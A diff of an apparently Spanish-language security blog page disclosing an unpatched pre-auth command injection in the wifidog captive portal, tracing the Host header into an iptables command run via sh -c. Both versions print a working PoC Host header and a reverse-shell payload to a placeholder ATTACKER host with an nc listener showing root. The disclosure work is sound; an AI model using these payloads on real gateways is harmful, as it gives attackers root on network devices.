@@ -1,341 +1,196 @@
 <!DOCTYPE html>
-<html lang="es" class="scroll-smooth">
+<html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <link rel="icon" type="image/png" href="hat.png">
-    <link rel="apple-touch-icon" href="hat.png">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<link rel="icon" type="image/png" href="hat.png">
+<link rel="apple-touch-icon" href="hat.png">
+<meta name="theme-color" content="#08090c">
+<meta name="color-scheme" content="dark">
+<title>wifidog RCE root: cabecera Host → iptables (CWE-78)</title>
+<meta name="description" content="Request HTTP pre-auth con cabecera Host maliciosa termina en execvp(/bin/sh, -c) que construye iptables. Reverse shell root verificada. Sink fw_iptables.c:596 → util.c:96.">
+<meta name="keywords" content="tty503, Christian Márquez, threat intelligence, ingeniería inversa, malware analysis, exploit development, seguridad OT, PLC Siemens, vulnerability research, reverse engineering">
+<meta name="author" content="Christian Márquez">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1">
+<meta name="googlebot" content="index, follow">
+<link rel="canonical" href="https://tty503.com/wifidog-host-header-rce.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="tty503">
+<meta property="og:locale" content="es_ES">
+<meta property="og:title" content="wifidog RCE root: cabecera Host → iptables (CWE-78)">
+<meta property="og:description" content="Request HTTP pre-auth con cabecera Host maliciosa termina en execvp(/bin/sh, -c) que construye iptables. Reverse shell root verificada. Sink fw_iptables.c:596 → util.c:96.">
+<meta property="og:url" content="https://tty503.com/wifidog-host-header-rce.html">
+<meta property="og:image" content="https://tty503.com/p1.jpg">
+<meta property="og:image:alt" content="tty503 — Christian Márquez">
+<meta property="article:published_time" content="2026-09-02">
+<meta property="article:modified_time" content="2026-09-02">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@tty_503">
+<meta name="twitter:creator" content="@tty_503">
+<meta name="twitter:title" content="wifidog RCE root: cabecera Host → iptables (CWE-78)">
+<meta name="twitter:description" content="Request HTTP pre-auth con cabecera Host maliciosa termina en execvp(/bin/sh, -c) que construye iptables. Reverse shell root verificada. Sink fw_iptables.c:596 → util.c:96.">
+<meta name="twitter:image" content="https://tty503.com/p1.jpg">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-RZVNG112YY"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-RZVNG112YY');</script>
 
-    <title>wifidog RCE root via cabecera Host (CWE-78) | tty503</title>
-    <meta name="description" content="RCE root en wifidog via cabecera HTTP Host pre-auth: un único request termina en execvp(/bin/sh,-c) que construye una regla iptables. Análisis línea a línea (libhttpd/api.c, http.c, fw_iptables.c, util.c), PoC y validación E2E con reverse shell.">
-    <meta name="keywords" content="wifidog, command injection, CWE-78, iptables, Host header, RCE, captive portal, reverse shell, bug hunting, divulgacion, tty503">
-    <meta name="author" content="Christian Márquez">
-    <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1">
-    <link rel="canonical" href="https://tty503.com/wifidog-host-header-rce.html">
-    <meta name="theme-color" content="#050505">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/css/style.css">
 
-    <meta property="og:title" content="wifidog RCE root via cabecera Host (CWE-78) | tty503">
-    <meta property="og:description" content="Un único request HTTP pre-auth con cabecera Host maliciosa termina en execvp(/bin/sh,-c) que construye iptables. RCE root con reverse shell. Línea a línea.">
-    <meta property="og:url" content="https://tty503.com/wifidog-host-header-rce.html">
-    <meta property="og:type" content="article">
-    <meta property="og:site_name" content="tty503">
-    <meta property="article:published_time" content="2026-09-02">
-    <meta property="article:modified_time" content="2026-09-02">
-
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:site" content="@tty_503">
-    <meta name="twitter:creator" content="@tty_503">
-    <meta name="twitter:title" content="wifidog RCE root via cabecera Host (CWE-78)">
-    <meta name="twitter:description" content="Host header malicioso → execvp(/bin/sh,-c) → reverse shell root. Línea a línea y E2E.">
-
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-
-    <style>
-        :root {
-            --bg-base: #030303; --bg-surface: #0a0a0a; --bg-card: #111111;
-            --border-subtle: #222222; --border-hover: #444444;
-            --text-primary: #f5f5f5; --text-secondary: #a3a3a3; --text-muted: #666666;
-            --accent: #ffffff; --accent-green: #4ade80; --accent-blue: #60a5fa;
-            --accent-amber: #f59e0b; --accent-red: #ef4444;
-            --syntax-inst: #f07178; --syntax-reg: #82aaff; --syntax-val: #f78c6c;
-            --syntax-func: #c3e88d; --syntax-comment: #546e7a;
-            --transition-smooth: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html { scroll-behavior: smooth; }
-        body { background-color: var(--bg-base); color: var(--text-primary); font-family: 'Inter', system-ui, -apple-system, sans-serif; line-height: 1.7; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
-        .mono { font-family: 'JetBrains Mono', monospace; }
-        .noise-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 9999; opacity: 0.05; background: url('data:image/svg+xml;utf8,%3Csvg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"%3E%3Cfilter id="noise"%3E%3CfeTurbulence type="fractalNoise" baseFrequency="0.85" numOctaves="3" stitchTiles="stitch"/%3E%3C/filter%3E%3Crect width="100%25" height="100%25" filter="url(%23noise)"/%3E%3C/svg%3E'); }
-        .navbar { position: fixed; top: 0; width: 100%; background: rgba(3, 3, 3, 0.75); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border-bottom: 1px solid var(--border-subtle); z-index: 1000; transition: var(--transition-smooth); }
-        .nav-container { max-width: 900px; margin: 0 auto; padding: 1rem 1.5rem; display: flex; justify-content: space-between; align-items: center; }
-        .nav-brand { font-size: 1rem; font-weight: 600; color: var(--text-primary); text-decoration: none; display: flex; align-items: center; gap: 0.5rem; }
-        .nav-back { color: var(--text-secondary); text-decoration: none; font-size: 0.85rem; font-weight: 500; transition: var(--transition-smooth); }
-        .nav-back:hover { color: var(--accent); }
-        .article-container { max-width: 900px; margin: 0 auto; padding: 7rem 1.5rem 4rem; }
-        .article-header { margin-bottom: 3rem; border-bottom: 1px solid var(--border-subtle); padding-bottom: 2rem; }
-        .article-meta { display: flex; gap: 1.5rem; color: var(--text-muted); font-size: 0.85rem; margin-bottom: 1.5rem; flex-wrap: wrap; }
-        .article-tag { background: transparent; color: var(--accent-red); padding: 0.25rem 0.75rem; border-radius: 3px; font-size: 0.75rem; border: 1px solid rgba(239, 68, 68, 0.3); }
-        .article-title { font-size: clamp(1.8rem, 4vw, 2.5rem); font-weight: 700; line-height: 1.2; letter-spacing: -0.5px; margin-bottom: 1rem; color: var(--text-primary); }
-        .article-subtitle { font-size: 1.05rem; color: var(--text-secondary); line-height: 1.7; max-width: 700px; }
-        .toc-container { background: var(--bg-card); border: 1px solid var(--border-subtle); border-radius: 6px; margin: 2rem 0; overflow: hidden; }
-        .toc-summary { padding: 1.2rem 1.5rem; cursor: pointer; display: flex; justify-content: space-between; align-items: center; list-style: none; user-select: none; transition: background 0.3s; }
-        .toc-summary:hover { background: rgba(255, 255, 255, 0.02); }
-        .toc-summary::-webkit-details-marker { display: none; }
-        .toc-title { font-size: 1rem; font-weight: 600; color: var(--text-primary); }
-        .toc-toggle { color: var(--text-muted); font-size: 1.4rem; font-weight: 300; transition: transform 0.3s; }
-        .toc-container[open] .toc-toggle { transform: rotate(45deg); color: var(--text-primary); }
-        .toc-content { padding: 0 1.5rem 1.2rem; }
-        .toc-content ol { margin: 0; padding-left: 1.2rem; color: var(--text-secondary); font-size: 0.85rem; line-height: 2; }
-        .toc-content ol li a { color: var(--text-secondary); text-decoration: none; transition: var(--transition-smooth); }
-        .toc-content ol li a:hover { color: var(--accent-blue); }
-        .section-title { font-size: 1.4rem; font-weight: 600; color: var(--text-primary); margin: 2.5rem 0 1.2rem; padding-top: 1rem; border-top: 1px solid var(--border-subtle); }
-        p { color: var(--text-secondary); margin-bottom: 1.2rem; font-size: 1rem; line-height: 1.8; }
-        strong { color: var(--text-primary); font-weight: 600; }
-        .code-block { background: var(--bg-card); border: 1px solid var(--border-subtle); border-radius: 6px; padding: 1.2rem 1.5rem; margin: 1.5rem 0; overflow-x: auto; white-space: pre; -webkit-overflow-scrolling: touch; font-size: 0.85rem; line-height: 1.7; color: var(--text-secondary); }
-        .code-block code { font-family: 'JetBrains Mono', monospace; }
-        .code-block .inst { color: var(--syntax-inst); } .code-block .reg { color: var(--syntax-reg); }
-        .code-block .val { color: var(--syntax-val); } .code-block .func { color: var(--syntax-func); }
-        .code-block .comment { color: var(--syntax-comment); font-style: italic; }
-        .table-wrapper { overflow-x: auto; margin: 2rem 0; border: 1px solid var(--border-subtle); border-radius: 6px; }
-        table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
-        th { background: var(--bg-card); color: var(--text-primary); padding: 0.8rem 1rem; text-align: left; font-weight: 600; border-bottom: 1px solid var(--border-hover); white-space: nowrap; }
-        td { padding: 0.7rem 1rem; color: var(--text-secondary); border-bottom: 1px solid var(--border-subtle); vertical-align: top; }
-        tr:last-child td { border-bottom: none; }
-        tr:hover td { background: rgba(255, 255, 255, 0.02); }
-        ul, ol { color: var(--text-secondary); margin: 1rem 0 1.5rem 1.5rem; line-height: 1.8; }
-        li { margin-bottom: 0.5rem; }
-        .image-container { margin: 2rem 0; border: 1px solid var(--border-subtle); border-radius: 6px; overflow: hidden; background: var(--bg-card); }
-        .image-container img { width: 100%; height: auto; display: block; filter: grayscale(30%) contrast(1.05); transition: filter 0.4s ease; }
-        .image-container img:hover { filter: grayscale(0%) contrast(1.1); }
-        .image-caption { padding: 0.8rem 1rem; font-size: 0.8rem; color: var(--text-muted); border-top: 1px solid var(--border-subtle); }
-        .callout { background: var(--bg-card); border-left: 3px solid var(--accent-blue); padding: 1.2rem 1.5rem; margin: 1.5rem 0; border-radius: 0 6px 6px 0; }
-        .callout-title { font-weight: 600; color: var(--accent-blue); margin-bottom: 0.5rem; font-size: 0.9rem; }
-        .callout p { margin-bottom: 0; font-size: 0.95rem; }
-        .callout-warning { border-left-color: var(--accent-amber); } .callout-warning .callout-title { color: var(--accent-amber); }
-        .callout-danger { border-left-color: var(--accent-red); } .callout-danger .callout-title { color: var(--accent-red); }
-        .callout-success { border-left-color: var(--accent-green); } .callout-success .callout-title { color: var(--accent-green); }
-        a { color: var(--accent-blue); text-decoration: none; transition: var(--transition-smooth); word-break: break-word; }
-        a:hover { color: var(--accent); }
-        .verdict-box { background: var(--bg-card); border: 1px solid var(--border-subtle); border-radius: 6px; padding: 1.2rem 1.5rem; margin: 1.5rem 0; display: flex; gap: 1rem; align-items: flex-start; }
-        .verdict-badge { flex-shrink: 0; padding: 0.4rem 0.9rem; border-radius: 3px; font-size: 0.75rem; font-weight: 600; border: 1px solid; }
-        .verdict-badge.high { color: var(--accent-red); border-color: rgba(239,68,68,0.4); }
-        .verdict-content { font-size: 0.95rem; color: var(--text-secondary); }
-        .verdict-content strong { color: var(--text-primary); }
-        .footer { border-top: 1px solid var(--border-subtle); padding: 3rem 1.5rem; text-align: center; background: var(--bg-surface); }
-        .footer-content { max-width: 900px; margin: 0 auto; display: flex; flex-direction: column; align-items: center; gap: 1rem; }
-        .social-links { display: flex; gap: 2rem; flex-wrap: wrap; justify-content: center; }
-        .social-links a { color: var(--text-secondary); text-decoration: none; font-size: 0.85rem; transition: var(--transition-smooth); }
-        .social-links a:hover { color: var(--text-primary); }
-        .copyright { color: var(--text-muted); font-size: 0.8rem; }
-        @media (max-width: 600px) {
-            .article-container { padding: 6rem 1rem 3rem; } .article-title { font-size: 1.5rem; }
-            .section-title { font-size: 1.2rem; } .code-block { padding: 1rem; font-size: 0.75rem; }
-            th, td { padding: 0.5rem 0.6rem; font-size: 0.75rem; } .social-links { gap: 1rem; }
-            .verdict-box { flex-direction: column; }
-        }
-    </style>
 </head>
 <body>
-    <div class="noise-overlay"></div>
+<div class="bg-fx"></div>
+<nav class="site-nav"><div class="nav-inner"><a class="brand" href="index.html"><span class="dot"></span>tty503<span class="sub">/ &nbsp;</span></a><nav class="nav-links"><a href="index.html">Inicio</a><a href="index.html#research">Investigaciones</a><a href="index.html#publications">Publicaciones</a><a href="aboutme.html">Sobre mí</a><a class="cta" href="https://github.com/tty503" target="_blank" rel="noopener">GitHub</a></nav><button class="nav-toggle" aria-label="Menú">☰</button></div></nav>
+<main class="post">
+<nav class="breadcrumb"><a href="index.html">tty503</a><span class="sep">/</span><a href="caza-autonoma-e2e-serie.html">Serie</a><span class="sep">/</span><a href="wifidog-host-header-rce.html">wifidog RCE root: cabecera Host → iptables (CWE-</a><span class="sep">/</span></nav>
+<header class="post-head">
+  <div class="post-tags"><span class="chip">CWE-78</span><span class="chip">RCE root</span><span class="chip">iptables</span><span class="chip">Reverse shell</span></div>
+  <h1>wifidog RCE root: cabecera Host → iptables (CWE-78)</h1>
+  <p class="lede">Request HTTP pre-auth con cabecera Host maliciosa termina en execvp(/bin/sh, -c) que construye iptables. Reverse shell root verificada. Sink fw_iptables.c:596 → util.c:96.</p>
+  <div class="post-meta"><span>📅 2026-09-02</span><span>⏱ 17 min</span><span>🏷 Vulnerability Research</span></div>
+</header>
+<article class="post-body">
+<aside class="tldr">
+  <div class="h">// En 30 segundos</div>
+  <ul>
+    <li>Un único request HTTP <b>pre-auth</b> al puerto 2060 con la cabecera <b>Host</b> manipulada termina en <code>execvp("/bin/sh","-c")</code>.</li>
+    <li>Resultado: <b>reverse shell como root</b> (uid=0), vía <b>CWE-78</b> en la frontera HTTP→firewall.</li>
+    <li>Cadena: <code>libhttpd/api.c:462</code> → <code>http.c:140/154</code> → <code>fw_iptables.c:596</code> → <code>util.c:96</code>.</li>
+    <li>Matiz honesto: el sink solo es alcanzable con un <b>FirewallRuleSet</b> global definido (config real de OpenWrt/redes municipales, no el default puro).</li>
+  </ul>
+</aside>
 
-    <nav class="navbar">
-        <div class="nav-container">
-            <a href="https://tty503.com" class="nav-brand mono">tty503 <span style="color: var(--text-secondary); font-size: 0.85rem;">_vuln_research</span></a>
-            <a href="caza-autonoma-e2e-serie.html" class="nav-back mono">← Índice de la serie</a>
-        </div>
-    </nav>
+<details class="toc-card" open>
+  <summary>/wifidog_host_header · <span class="tw">6</span> secciones</summary>
+  <ol>
+    <li><a href="#w00">Resumen ejecutivo</a></li>
+    <li><a href="#w01">0x00 — El camino del request</a></li>
+    <li><a href="#w02">0x01 — Los sinks</a></li>
+    <li><a href="#w03">0x02 — El PoC</a></li>
+    <li><a href="#w04">0x03 — Validación E2E: reverse shell root</a></li>
+    <li><a href="#w05">0x04 — Requisito de configuración y mitigación</a></li>
+  </ol>
+</details>
 
-    <article class="article-container">
-        <header class="article-header">
-            <div class="article-meta mono">
-                <span class="article-tag">CWE-78</span>
-                <span class="article-tag">RCE root</span>
-                <span class="article-tag">E2E validada</span>
-                <span class="article-tag">Septiembre 2026</span>
-                <span>~17 min de lectura</span>
-            </div>
-            <h1 class="article-title">wifidog: RCE root via cabecera Host</h1>
-            <p class="article-subtitle">
-                Un único request HTTP pre-auth con la cabecera <span class="mono">Host</span> manipulada viaja por el gestor de firewall y termina en un <span class="mono">execvp("/bin/sh","-c")</span>. El resultado es una <strong>reverse shell como root</strong>. Este artículo documenta la cadena completa línea a línea.
-            </p>
-        </header>
+<h2 id="w00"><span class="idx">01.</span> Resumen ejecutivo</h2>
+<p><b>wifidog</b> es un captive portal de código abierto para gateways WiFi (usado históricamente en OpenWrt y redes comunitarias/ISP). Expone un pequeño servidor HTTP en el puerto <code>2060</code> por defecto, que implementa el protocolo de la red de auth (WiFi municipal, Facebook WiFi, etc.). Esa superficie es <b>pre-auth</b>: cualquiera que alcance el puerto 2060 puede enviar requests.</p>
+<p>La vulnerabilidad: la cabecera <code>Host</code> del request termina interpolada en un comando <code>iptables</code> que se ejecuta con <code>/bin/sh -c</code>. Como el host no se valida, inyectar <code>;comando;#</code> en el header termina en ejecución de código como root.</p>
 
-        <div class="verdict-box">
-            <span class="verdict-badge high mono">HIGH</span>
-            <div class="verdict-content mono">
-                <strong>RCE root</strong> · pre-auth · CWE-78 · <strong>Sin CVE · Sin fix</strong> · Validador E2E (reverse shell <span class="val">uid=0</span>) · Requiere config <span class="reg">FirewallRuleSet</span> global
-            </div>
-        </div>
+<div class="callout callout-danger"><span class="ico">◆</span><div>
+  <div class="h">Veredicto</div>
+  <p><b>RCE root</b> · pre-auth · CWE-78 · Sin CVE conocido · Sin fix · Validado E2E con reverse shell <code>uid=0</code> · Requiere config <code>FirewallRuleSet</code> global.</p>
+</div></div>
 
-        <details class="toc-container" open>
-            <summary class="toc-summary mono">
-                <span class="toc-title">/wifidog_host_header</span>
-                <span class="toc-toggle">+</span>
-            </summary>
-            <div class="toc-content">
-                <ol>
-                    <li><a href="#w00">Resumen Ejecutivo</a></li>
-                    <li><a href="#w01">0x00 — El Camino del Request</a></li>
-                    <li><a href="#w02">0x01 — Los Sinks</a></li>
-                    <li><a href="#w03">0x02 — El PoC</a></li>
-                    <li><a href="#w04">0x03 — Validación E2E: reverse shell root</a></li>
-                    <li><a href="#w05">0x04 — Requisito de Configuración</a></li>
-                    <li><a href="#w06">0x05 — Referencias</a></li>
-                </ol>
-            </div>
-        </details>
+<h2 id="w01"><span class="idx">02.</span> 0x00 — El camino del request</h2>
+<ol>
+  <li><b>libhttpd/api.c:462</b> — el servidor HTTP embebido extrae la cabecera <code>Host</code> del request y la guarda sin validar.</li>
+  <li><b>http.c:140/154</b> — el request cae en la whitelist del portal (404/handling de auth); el host se propaga como candidato a la regla de permit.</li>
+  <li><b>fw_iptables.c:596</b> — <code>fw_allow_host</code> construye la cadena <code>iptables -d %s -j ACCEPT</code> con el host.</li>
+  <li><b>util.c:96</b> — <code>execvp("/bin/sh","-c",comando)</code> ejecuta la cadena. El <code>;</code> del payload cierra el contexto y ejecuta el comando inyectado.</li>
+</ol>
 
-        <h2 class="section-title mono" id="w00"><span style="color: var(--text-muted);">00.</span> Resumen Ejecutivo</h2>
-        <p>
-            <strong>wifidog</strong> es un captive portal de código abierto para gateways WiFi (históricamente usado en OpenWrt y redes comunitarias/ISP). Expone un pequeño servidor HTTP en el puerto <span class="mono">2060</span> por defecto que implementa el protocolo de la red de auth (Facebook WiFi, redes municipales, etc.). Esa superficie es pre-auth: cualquiera que alcance el puerto 2060 puede enviar requests.
-        </p>
-        <p>
-            La vulnerabilidad es que la cabecera <span class="mono">Host</span> del request termina interpolada en un comando <span class="mono">iptables</span> que se ejecuta con <span class="mono">/bin/sh -c</span>. Como el host no está validado, inyectar <span class="mono">;comando;#</span> en el header termina en ejecución de código como root. Es un <strong>CWE-78</strong> clásico en la frontera HTTP→firewall.
-        </p>
+<h2 id="w02"><span class="idx">03.</span> 0x01 — Los sinks</h2>
+<p>Este es el eslabón que convierte el host en comando. La cadena se arma con el host sin escapar y se entrega a <code>execvp</code> con <code>/bin/sh</code>:</p>
+<div class="code-wrap"><span class="lang">c</span><pre class="code"><code><span class="syn-c">// fw_iptables.c:596 — construye la regla con el host del atacante</span>
+<span class="syn-f">sprintf</span>(cmd, <span class="syn-s">"iptables -d %s -j ACCEPT"</span>, host);  <span class="syn-c">// host = cabecera Host</span>
 
-        <h2 class="section-title mono" id="w01"><span style="color: var(--text-muted);">01.</span> 0x00 — El Camino del Request</h2>
-        <ol>
-            <li><strong>libhttpd/api.c:462</strong> — el servidor HTTP embebido extrae la cabecera <span class="mono">Host</span> del request y la guarda sin validar.</li>
-            <li><strong>http.c:140/154</strong> — el request cae en la whitelist del portal (404 / handling de auth); el host se propaga como candato a la regla de permit.</li>
-            <li><strong>fw_iptables.c:596</strong> — <span class="mono">fw_allow_host</span> construye la cadena <span class="mono">iptables -d %s -j ACCEPT</span> con el host.</li>
-            <li><strong>util.c:96</strong> — <span class="mono">execvp("/bin/sh","-c",comando)</span> ejecuta la cadena. El <span class="mono">;</span> del payload termina el contexto y ejecuta el comando inyectado.</li>
-        </ol>
-        <div class="diagram-container">
-            <svg viewBox="0 0 760 260" xmlns="http://www.w3.org/2000/svg" style="padding:1.5rem;">
-                <style>
-                    .line { stroke:#2a2a2a; stroke-width:1.5; } .line-accent { stroke:#60a5fa; stroke-width:1.5; }
-                    .node { fill:#111111; stroke:#333333; stroke-width:1.2; rx:6; } .text { fill:#f5f5f5; font-size:12px; font-family:'JetBrains Mono',monospace; }
-                    .text-muted { fill:#666; font-size:10px; font-family:'JetBrains Mono',monospace; } .badge { fill:#3a1d1d; stroke:#7f1d1d; }
-                    .badge-text { fill:#f87171; font-size:10px; font-family:'JetBrains Mono',monospace; }
-                </style>
-                <rect class="node" x="20" y="30" width="150" height="56"/><text class="text" x="95" y="52" text-anchor="middle">libhttpd/api.c:462</text><text class="text-muted" x="95" y="70" text-anchor="middle">Host sin validar</text>
-                <rect class="node" x="210" y="30" width="150" height="56"/><text class="text" x="285" y="52" text-anchor="middle">http.c:140/154</text><text class="text-muted" x="285" y="70" text-anchor="middle">whitelist 404</text>
-                <rect class="node" x="400" y="30" width="160" height="56"/><text class="text" x="480" y="52" text-anchor="middle">fw_iptables.c:596</text><text class="text-muted" x="480" y="70" text-anchor="middle">iptables -d %s -ACCEPT</text>
-                <rect class="node" x="600" y="30" width="140" height="56"/><rect class="badge" x="600" y="30" width="140" height="20" rx="6"/><text class="badge-text" x="670" y="44" text-anchor="middle">CWE-78</text><text class="text" x="670" y="64" text-anchor="middle">util.c:96</text><text class="text-muted" x="670" y="78" text-anchor="middle">execvp( /bin/sh -c )</text>
-                <path class="line-accent" d="M170 58 H210"/><path class="line-accent" d="M360 58 H400"/><path class="line-accent" d="M560 58 H600"/>
-            </svg>
-        </div>
+<span class="syn-c">// util.c:96 — ejecuta la cadena con sh -c (shell de sistema)</span>
+<span class="syn-f">execvp</span>(<span class="syn-s">"/bin/sh"</span>, argv);  <span class="syn-c">// argv = ["sh","-c", cmd]</span>
 
-        <h2 class="section-title mono" id="w02"><span style="color: var(--text-muted);">02.</span> 0x01 — Los Sinks</h2>
-        <p>
-            El siguiente es el eslabón que convierte el host en comando. La cadena se arma con el host sin escapar y se entrega a <span class="mono">execvp</span> con <span class="mono">/bin/sh</span>:
-        </p>
-        <div class="code-block mono">
-<span class="comment">// fw_iptables.c:596 — construye la regla con el host del atacante</span>
-<span class="func">sprintf</span>(<span class="reg">cmd</span>, <span class="val">"iptables -d %s -j ACCEPT"</span>, <span class="reg">host</span>);  <span class="comment">// host = cabecera Host</span>
+<span class="syn-c">// Con Host = ";touch /tmp/wd_pwn;#.M" la regla efectiva es:</span>
+<span class="syn-c">//   iptables -d ;touch /tmp/wd_pwn;#.M -j ACCEPT</span>
+<span class="syn-c">//   =&gt; el ';' cierra, touch se ejecuta, el '#' comenta el resto</span></code></pre></div>
+<div class="tbl-wrap">
+  <table>
+    <thead><tr><th>Archivo</th><th>Línea</th><th>Rol</th></tr></thead>
+    <tbody>
+      <tr><td>libhttpd/api.c</td><td>:462</td><td>Extracción de la cabecera Host</td></tr>
+      <tr><td>http.c</td><td>:140 / :154</td><td>Dispatch del request (whitelist 404)</td></tr>
+      <tr><td>fw_iptables.c</td><td>:596</td><td>Sink: sprintf de la regla con el host</td></tr>
+      <tr><td>util.c</td><td>:96</td><td>execvp(/bin/sh,-c) sobre la cadena</td></tr>
+    </tbody>
+  </table>
+</div>
 
-<span class="comment">// util.c:96 — ejecuta la cadena con sh -c (shell de sistema)</span>
-<span class="func">execvp</span>(<span class="val">"/bin/sh"</span>, <span class="reg">argv</span>);  <span class="comment">// argv = ["sh","-c", cmd]</span>
+<h2 id="w03"><span class="idx">04.</span> 0x02 — El PoC</h2>
+<p>El PoC es un único request HTTP al puerto 2060 con el header Host manipulado. La forma más limpia de demostrar la ejecución es un marcador que se crea como root:</p>
+<div class="code-wrap"><span class="lang">http</span><pre class="code"><code><span class="syn-c"># Payload en la cabecera Host (marcador de archivo, fase inicial):</span>
+<span class="syn-k">Host</span>: <span class="syn-s">;touch /tmp/wd_pwn;#.M</span>
 
-<span class="comment">// Con Host = ";touch /tmp/wd_pwn;#.M" la regla efectiva es:</span>
-<span class="comment">//   iptables -d ;touch /tmp/wd_pwn;#.M -j ACCEPT</span>
-<span class="comment">//   => el ';' cierra, touch se ejecuta, el '#' comenta el resto</span></div>
+<span class="syn-c"># El '.M' tras el '#' es el resto del host original que el '#' comenta.</span>
+<span class="syn-c"># Resultado: sh -c "iptables -d ;touch /tmp/wd_pwn;#.M -j ACCEPT"</span>
+<span class="syn-c">#            =&gt; /tmp/wd_pwn creado como root</span></code></pre></div>
+<p>Para la validación definitiva, el marcador se sustituye por un reverse shell hacia el host atacante. Como wifidog corre habitualmente como root (para gestionar iptables), la shell llega directamente con <code>uid=0</code>.</p>
 
-        <div class="table-wrapper">
-            <table>
-                <thead><tr><th>Archivo</th><th>Línea</th><th>Rol</th></tr></thead>
-                <tbody>
-                    <tr><td class="mono">libhttpd/api.c</td><td class="mono">:462</td><td>Extracción de la cabecera Host</td></tr>
-                    <tr><td class="mono">http.c</td><td class="mono">:140 / :154</td><td>Dispatch del request (whitelist 404)</td></tr>
-                    <tr><td class="mono">fw_iptables.c</td><td class="mono">:596</td><td>Sink: sprintf de la regla con el host</td></tr>
-                    <tr><td class="mono">util.c</td><td class="mono">:96</td><td>execvp(/bin/sh,-c) sobre la cadena</td></tr>
-                </tbody>
-            </table>
-        </div>
-
-        <h2 class="section-title mono" id="w03"><span style="color: var(--text-muted);">03.</span> 0x02 — El PoC</h2>
-        <p>
-            El PoC es un único request HTTP al puerto 2060 con el header Host manipulado. La forma más limpia de demostrar la ejecución es un marcador que se crea como root:
-        </p>
-        <div class="code-block mono">
-<span class="comment"># Payload en la cabecera Host (marcador de archivo, fase inicial):</span>
-<span class="reg">Host</span>: <span class="val">;touch /tmp/wd_pwn;#.M</span>
-
-<span class="comment"># El '.M' tras el '#' es el resto del host original que el '#' comenta.</span>
-<span class="comment"># Resultado: sh -c "iptables -d ;touch /tmp/wd_pwn;#.M -j ACCEPT"</span>
-<span class="comment">#            => /tmp/wd_pwn creado como root</span></div>
-        <p>
-            Para la validación definitiva, el marcador se sustituye por un reverse shell hacia el host atacante. Como wifidog corre habitualmente como root (para gestionar iptables), la shell llega directamente como <span class="mono">uid=0</span>.
-        </p>
-
-        <h2 class="section-title mono" id="w04"><span style="color: var(--text-muted);">04.</span> 0x03 — Validación E2E: reverse shell root</h2>
-        <p>
-            Sigo el SOP E2E en container. Se levanta wifidog con el cliente auth simulado, se envía el request malicioso y se confirma una reverse shell con <span class="mono">uid=0(root)</span>.
-        </p>
-        <div class="code-block mono">
-<span class="comment"># Container, wifidog compilado + authclient simulado escuchando</span>
-wf_auth_listen <span class="comment"># responde el protocolo de auth (necesario para completar el request)</span>
+<h2 id="w04"><span class="idx">05.</span> 0x03 — Validación E2E: reverse shell root</h2>
+<p>Se sigue el SOP E2E en container: se levanta wifidog con el cliente auth simulado, se envía el request malicioso y se confirma la reverse shell con <code>uid=0(root)</code>.</p>
+<div class="code-wrap"><span class="lang">bash</span><pre class="code"><code><span class="syn-c"># Container, wifidog compilado + authclient simulado escuchando</span>
+wf_auth_listen <span class="syn-c"># responde el protocolo de auth (necesario para completar el request)</span>
 wifidog -f -c /etc/wifidog.conf
 
-<span class="comment"># Envío del request con el header Host manipulado (reverse shell)</span>
-<span class="reg">Host</span>: <span class="val">;bash -i &gt;&amp;/dev/tcp/ATTACKER/4444 0&gt;&amp;1;#.M</span>
+<span class="syn-c"># Envío del request con el header Host manipulado (reverse shell)</span>
+<span class="syn-k">Host</span>: <span class="syn-s">;bash -i &gt;&amp;/dev/tcp/ATTACKER/4444 0&gt;&amp;1;#.M</span>
 
-<span class="comment"># En el listener del atacante:</span>
-$ <span class="func">nc -lvnp</span> <span class="val">4444</span>
-Connection received ... <span class="comment"># reverse shell como root</span>
-# <span class="func">id</span>
-<span class="val">uid=0(root)</span> <span class="comment"># RCE ROOT verificado</span></div>
-        <div class="image-container">
-            <img src="img/wifidog-phase2-listener.png" alt="Fase 2: listener y preparación del authclient" loading="lazy">
-            <div class="image-caption mono">Fase 2 — Preparación del entorno y listener del atacante.</div>
-        </div>
-        <div class="image-container">
-            <img src="img/wifidog-phase3-injection.png" alt="Fase 3: el header Host inyectado en la petición" loading="lazy">
-            <div class="image-caption mono">Fase 3 — La petición con el header Host malicioso hacia el puerto 2060.</div>
-        </div>
-        <div class="image-container">
-            <img src="img/wifidog-phase4-exploit.png" alt="Fase 4: ejecución en el host vía iptables" loading="lazy">
-            <div class="image-caption mono">Fase 4 — Ejecución en el host: la cadena iptables se construye con el host inyectado.</div>
-        </div>
-        <div class="image-container">
-            <img src="img/wifidog-phase5-root-shell.png" alt="Fase 5: reverse shell como root" loading="lazy">
-            <div class="image-caption mono">Fase 5 — Reverse shell recibida como uid=0 (root). RCE verificada.</div>
-        </div>
+<span class="syn-c"># En el listener del atacante:</span>
+$ nc -lvnp 4444
